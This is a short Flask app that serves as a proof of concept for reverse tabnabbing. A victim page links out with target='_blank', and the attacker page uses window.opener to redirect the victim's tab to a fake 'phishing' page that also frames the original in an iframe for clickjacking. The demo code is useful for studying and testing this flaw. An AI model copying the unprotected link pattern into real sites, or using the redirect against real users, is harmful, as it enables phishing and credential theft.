from flask import Flask
app = Flask(__name__)

@app.route('/victim')
def victim():
    return 'Victim Page<br/><a href="/attacker" target="_blank">Open PoC Link</a>'

@app.route('/attacker')
def attacker():
    return """
      <script>
        window.opener.location.replace("/attacker_phishing");
      </script>
      Attacker Page (only for distraction)
    """
@app.route('/attacker_phishing')
def phishing():
    return """
        Phishing page (changed from Victim Page)
        <br/></br>
        Adding iframe for clickjacking attacks</br>
        <iframe src="/victim"/>
    """

if __name__ == '__main__':
    app.run()
